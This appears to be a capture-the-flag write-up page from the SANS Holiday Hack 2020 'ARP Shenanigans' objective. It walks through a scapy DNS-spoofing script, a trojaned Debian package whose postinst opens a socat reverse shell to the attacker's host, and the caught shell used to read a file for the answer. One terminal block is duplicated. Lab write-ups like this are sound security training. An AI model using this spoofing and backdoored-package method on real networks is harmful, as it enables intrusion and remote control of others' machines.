+    sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface=&quot;eth0&quot;, count=1)
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<p>We need to modify the script as follows</p>
+<p><img alt="dnschanges" src="../../images/obj9/dns_changes.PNG" /></p>
+<p>The modified script is as follows</p>
+<pre><code class="language-bash">guest@e41e2320b206:~/scripts$ cat our_dns_resp.py 
+#!/usr/bin/python3
+from scapy.all import *
+import netifaces as ni
+import uuid
+
+# Our eth0 IP
+ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+# Our Mac Addr
+macaddr = ':'.join(['{:02x}'.format((uuid.getnode() &gt;&gt; i) &amp; 0xff) for i in range(0,8*6,8)][::-1])
+# destination ip we arp spoofed
+ipaddr_we_arp_spoofed = &quot;10.6.6.53&quot;
+
+def handle_dns_request(packet):
+    # Need to change mac addresses, Ip Addresses, and ports below.
+    # We also need
+    eth = Ether(src=macaddr, dst=&quot;4c:24:57:ab:ed:84&quot;)   # need to replace mac addresses
+    ip  = IP(dst=&quot;10.6.6.35&quot;, src=ipaddr_we_arp_spoofed)                          # need to replace IP addresses
+    udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)                             # need to replace ports
+    dns = DNS(id=packet[DNS].id, qd=packet[DNS].qd, qr=1,an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata=&quot;10.6.0.3&quot;))
+    dns_response = eth / ip / udp / dns
+    sendp(dns_response, iface=&quot;eth0&quot;)
+
+def main():
+    berkeley_packet_filter = &quot; and &quot;.join( [
+        &quot;udp dst port 53&quot;,                              # dns
+        &quot;udp[10] &amp; 0x80 = 0&quot;,                           # dns request
+        &quot;dst host {}&quot;.format(ipaddr_we_arp_spoofed),    # destination ip we had spoofed (not our real ip)
+        &quot;ether dst host {}&quot;.format(macaddr)             # our macaddress since we spoofed the ip to our mac
+    ] )
+
+    # sniff the eth0 int without storing packets in memory and stopping after one dns request
+    sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface=&quot;eth0&quot;, count=0)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<p>Now with our <code>our_arp_resp.py</code> script running, let's additionally run <code>our_dns_resp.py</code> as well. Let's sniff packets on eth0 interface to check if our DNS spoof worked.</p>
+<pre><code>guest@e41e2320b206:~$ tcpdump -nni eth0 -w dns_spoof.pcap                                                                                                                      
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes                                                                                             
+^C84 packets captured                                                                                                                                                          
+103 packets received by filter                                                                                                                                                 
+0 packets dropped by kernel                                                                                                                                                    
+guest@e41e2320b206:~$ /usr/local/bin/scapy                                                                                                                                     
+INFO: Can't import matplotlib. Won't be able to plot.                                                                                                                          
+INFO: Can't import PyX. Won't be able to use psdump() or pdfdump().                                                                                                            
+INFO: No IPv6 support in kernel                                                                                                                                                
+INFO: Can't import python-cryptography v1.7+. Disabled WEP decryption/encryption. (Dot11)                                                                                      
+INFO: Can't import python-cryptography v1.7+. Disabled IPsec encryption/authentication.                                                                                        
+WARNING: IPython not available. Using standard Python shell instead.                                                                                                           
+AutoCompletion, History are disabled.                                                                                                                                          
+
+                     aSPY//YASa                                                                                                                                                
+             apyyyyCY//////////YCa       |                                                                                                                                     
+            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy                                                                                                                    
+ ayp ayyyyyyySCP//Pp           syY//C    | Version 2.4.4                                                                                                                       
+ AYAsAYYYYYYYY///Ps              cY//S   |                                                                                                                                     
+         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy                                                                                                     
+         SPPPP///a          pP///AC//Y   |                                                                                                                                     
+              A//A            cyP////C   | Have fun!                                                                                                                           
+              p///Ac            sC///a   |                                                                                                                                     
+              P////YCpc           A//A   | What is dead may never die!                                                                                                         
+       scccccp///pSP///p          p//Y   |                     -- Python 2                                                                                                     
+      sY/////////y  caa           S//P   |                                                                                                                                     
+       cayCyayP//Ya              pY/Ya                                                                                                                                         
+        sY/PsY////YCc          aC//Yp                                                                                                                                          
+         sc  sccaCY//PCypaapyCP//YSs                                                                                                                                           
+                  spCPY//////YPSps                                                                                                                                             
+                       ccaacs                                                                                                                                                  
+
+&gt;&gt;&gt; PACKETS = rdpcap(&quot;/home/guest/dns_spoof.pcap&quot;)                                                                       guest@e41e2320b206:~$ tcpdump -nni eth0 -w dns_spoof.pcap                                                                                                                      
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes                                                                                             
+^C84 packets captured                                                                                                                                                          
+103 packets received by filter                                                                                                                                                 
+0 packets dropped by kernel                                                                                                                                                    
+guest@e41e2320b206:~$ /usr/local/bin/scapy                                                                                                                                     
+INFO: Can't import matplotlib. Won't be able to plot.                                                                                                                          
+INFO: Can't import PyX. Won't be able to use psdump() or pdfdump().                                                                                                            
+INFO: No IPv6 support in kernel                                                                                                                                                
+INFO: Can't import python-cryptography v1.7+. Disabled WEP decryption/encryption. (Dot11)                                                                                      
+INFO: Can't import python-cryptography v1.7+. Disabled IPsec encryption/authentication.                                                                                        
+WARNING: IPython not available. Using standard Python shell instead.                                                                                                           
+AutoCompletion, History are disabled.                                                                                                                                          
+
+                     aSPY//YASa                                                                                                                                                
+             apyyyyCY//////////YCa       |                                                                                                                                     
+            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy                                                                                                                    
+ ayp ayyyyyyySCP//Pp           syY//C    | Version 2.4.4                                                                                                                       
+ AYAsAYYYYYYYY///Ps              cY//S   |                                                                                                                                     
+         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy                                                                                                     
+         SPPPP///a          pP///AC//Y   |                                                                                                                                     
+              A//A            cyP////C   | Have fun!                                                                                                                           
+              p///Ac            sC///a   |                                                                                                                                     
+              P////YCpc           A//A   | What is dead may never die!                                                                                                         
+       scccccp///pSP///p          p//Y   |                     -- Python 2                                                                                                     
+      sY/////////y  caa           S//P   |                                                                                                                                     
+       cayCyayP//Ya              pY/Ya                                                                                                                                         
+        sY/PsY////YCc          aC//Yp                                                                                                                                          
+         sc  sccaCY//PCypaapyCP//YSs                                                                                                                                           
+                  spCPY//////YPSps                                                                                                                                             
+                       ccaacs                                                                                                                                                  
+
+&gt;&gt;&gt; PACKETS = rdpcap(&quot;/home/guest/dns_spoof.pcap&quot;)                                                                       
+&gt;&gt;&gt; PACKETS.show()                                                                                                                                                             
+0063 Ether / IP / TCP 10.6.0.3:47554 &gt; 10.6.6.35:64352 S                                                                                                                       
+0064 Ether / IP / TCP 10.6.6.35:64352 &gt; 10.6.0.3:47554 SA                                                                                                                      
+0065 Ether / IP / TCP 10.6.0.3:47554 &gt; 10.6.6.35:64352 A                                                                                                                       
+0066 Ether / IP / TCP 10.6.0.3:47554 &gt; 10.6.6.35:64352 PA / Raw                                                                                                                
+0067 Ether / IP / TCP 10.6.6.35:64352 &gt; 10.6.0.3:47554 A                                                                                                                       
+0068 Ether / IP / TCP 10.6.6.35:64352 &gt; 10.6.0.3:47554 PA / Raw                                                                                                                
+0069 Ether / IP / TCP 10.6.0.3:47554 &gt; 10.6.6.35:64352 A                                                                                                                       
+0070 Ether / IP / TCP 10.6.0.3:47554 &gt; 10.6.6.35:64352 PA / Raw                                                                                                                
+0071 Ether / IP / TCP 10.6.0.3:47554 &gt; 10.6.6.35:64352 PA / Raw                                                                                                                
+0072 Ether / IP / TCP 10.6.6.35:64352 &gt; 10.6.0.3:47554 PA / Raw                                                                                                                
+0073 Ether / IP / TCP 10.6.6.35:32800 &gt; 10.6.0.3:http S                                                                                                                        
+0074 Ether / IP / TCP 10.6.0.3:http &gt; 10.6.6.35:32800 RA                                                                                                                       
+0075 Ether / IP / TCP 10.6.6.35:64352 &gt; 10.6.0.3:47554 FPA / Raw                                                                                                               
+0076 Ether / IP / TCP 10.6.0.3:47554 &gt; 10.6.6.35:64352 A
+0077 Ether / IP / TCP 10.6.0.3:47554 &gt; 10.6.6.35:64352 FA
+0078 Ether / IP / TCP 10.6.6.35:64352 &gt; 10.6.0.3:47554 A
+
+</code></pre>
+<p>Looks like our DNS Spoof worked!
+The below packet is particularly interesting. Looks like 10.6.6.35 is trying to send an HTTP request to port 80.</p>
+<p><code>0073 Ether / IP / TCP 10.6.6.35:32800 &gt; 10.6.0.3:http S</code></p>
+<p>Let' spoof an http  server on port 80. We can do this by running the command <code>python3 -m http.server 80</code>.Looks like the malware running on 10.6.6.35 is trying to fetch <code>/pub/jfrost/backdoor/suriv_amd64.deb</code>. </p>
+<pre><code>guest@e41e2320b206:~$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.6.6.35 - - [10/Jan/2021 19:14:14] code 404, message File not found
+10.6.6.35 - - [10/Jan/2021 19:14:14] &quot;GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1&quot; 404 -
+10.6.6.35 - - [10/Jan/2021 19:14:15] code 404, message File not found
+10.6.6.35 - - [10/Jan/2021 19:14:15] &quot;GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1&quot; 404 -
+10.6.6.35 - - [10/Jan/2021 19:14:16] code 404, message File not found
+10.6.6.35 - - [10/Jan/2021 19:14:16] &quot;GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1&quot; 404 -
+</code></pre>
+<p>Let's make this deb file available. However we will customise this deb file so that when the host installs it a reverse shell would be spawned and we can obtain command line access.
+We can choose any of the deb files available in <code>/home/guest/debs</code> to customise.</p>
+<pre><code class="language-bash">guest@8238d08d5d09:~/debs$ ls
+gedit-common_3.36.1-1_all.deb                      nano_4.8-1ubuntu1_amd64.deb                    nmap_7.80+dfsg1-2build1_amd64.deb  unzip_6.0-25ubuntu1_amd64.deb
+golang-github-huandu-xstrings-dev_1.2.1-1_all.deb  netcat-traditional_1.10-41.1ubuntu1_amd64.deb  socat_1.7.3.3-2_amd64.deb
+</code></pre>
+<p>We get a clue on how to customise a deb file from hint 4. We need to</p>
+<ul>
+<li>extract the deb using command <code>dpkg -x &lt;file.deb&gt; &lt;directory&gt;</code></li>
+<li>create a directory called DEBIAN in it which contains two files -control and postinst</li>
+<li>rebuild the deb using command <code>dpkg-deb --build &lt;directory&gt;</code></li>
+</ul>
+<p>The postinst file will contain the commands to be executed. In our case we will include a command to spawn a Socat reverse shell.</p>
+<pre><code>guest@f9ce1b9af4a1:~/debs$ dpkg -x nmap_7.80+dfsg1-2build1_amd64.deb work
+guest@f9ce1b9af4a1:~/debs$ mkdir -p work/DEBIAN
+guest@f9ce1b9af4a1:~/debs$ touch work/DEBIAN/control
+guest@f9ce1b9af4a1:~/debs$ touch work/DEBIAN/postinst
+guest@f9ce1b9af4a1:~/debs$ vi work/DEBIAN/control
+guest@f9ce1b9af4a1:~/debs$ cat work/DEBIAN/control 
+Package: nmap7
+Version: 7.80+dfsg1-2
+Architecture: any
+Maintainer: lel &lt;packages@qa.debian.org&gt;
+Description: must-install awesome tool
+guest@f9ce1b9af4a1:~/debs$ vi work/DEBIAN/postinst
+guest@f9ce1b9af4a1:~/debs$ cat work/DEBIAN/postinst
+RHOST=10.6.0.3
+RPORT=4444
+socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
+guest@f9ce1b9af4a1:~/debs$ dpkg-deb --build work/
+dpkg-deb: error: maintainer script 'postinst' has bad permissions 664 (must be &gt;=0555 and &lt;=0775)
+guest@f9ce1b9af4a1:~/debs$ chmod 775 work/DEBIAN/postinst
+guest@f9ce1b9af4a1:~/debs$ dpkg-deb --build work/
+dpkg-deb: building package 'nmap7' in 'work.deb'.
+</code></pre>
+<p>Now let's set up a Socat listener to receive the shell.</p>
+<pre><code class="language-bash">socat file:`tty`,raw,echo=0 tcp-listen:4444
+</code></pre>
+<p>Let's rename the deb file and serve it. Make sure the hierarchy of directories is correct.</p>
+<pre><code class="language-bash">guest@f9ce1b9af4a1:~/debs$ mkdir -p ./pub/jfrost/backdoor/
+guest@f9ce1b9af4a1:~/debs$ cp work.deb suriv_amd64.deb
+guest@f9ce1b9af4a1:~/debs$ cp suriv_amd64.deb ./pub/jfrost/backdoor/
+guest@f9ce1b9af4a1:~/debs$ python3 -m http.server 80
+</code></pre>
+<p>We caught the reverse shell!</p>
+<pre><code class="language-bash">guest@f9ce1b9af4a1:~$ socat file:`tty`,raw,echo=0 tcp-listen:4444
+/bin/sh: 0: can't access tty; job control turned off
+</code></pre>
+<pre><code class="language-bash">guest@f9ce1b9af4a1:~$ socat file:`tty`,raw,echo=0 tcp-listen:4444
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+bash: /root/.bashrc: Permission denied
+jfrost@e0b14eab16d0:/$ ls
+NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt  etc    lib64   opt   sbin  usr
+bin                                            home   libx32  proc  srv   var
+boot                                           lib    media   root  sys
+dev                                            lib32  mnt     run   tmp
+</code></pre>
+<p>On opening the file <code>NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt</code> and reading it we come across the following paragraph.</p>
+<blockquote>
+<p>RESOLUTIONS:
+The board took up final discussions of the plans presented last year for the expansion of Santa’s Castle to include new courtyard, additional floors, elevator, roughly tripling the size of the current castle.  Architect Ms. Pepper reviewed the planned changes and engineering reports. Chairman Frost noted, “These changes will put a heavy toll on the infrastructure of the North Pole.”  Mr. Krampus replied, “The infrastructure has already been expanded to handle it quite easily.”  Chairman Frost then noted, “But the additional traffic will be a burden on local residents.”  Dolly explained traffic projections were all in alignment with existing roadways.  Chairman Frost then exclaimed, “But with all the attention focused on Santa and his castle, how will people ever come to refer to the North Pole as ‘The Frostiest Place on Earth?’”  Mr. In-the-Box pointed out that new tourist-friendly taglines are always under consideration by the North Pole Chamber of Commerce, and are not a matter for this Board.  Mrs. Nature made a motion to approve.  Seconded by Mr. Cornelius.  Tanta Kringle recused herself from the vote given her adoption of Kris Kringle as a son early in his life.  </p>
+</blockquote>
+<h2 id="rejoice">Rejoice</h2>
+<p>We found that Tanta Kringle recused herself from the vote described on the document!</p>
+<blockquote>
+<p>Answer</p>
+<p>Tanta Kringle</p>
+</blockquote>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+          <a href="../objective8/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                8) Broken Tag Generator
+              </div>
+            </div>
+          </a>
+        
+        
+          <a href="../objective10/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                10) Defeat Fingerprint Sensor
+              </div>
+            </div>
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/vendor.93c04032.min.js"></script>
+      <script src="../../assets/javascripts/bundle.83e5331e.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../..",
+          features: ['navigation.expand'],
+          search: Object.assign({
+            worker: "../../assets/javascripts/worker/search.8c7e0a7e.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+    
+  </body>
+</html>
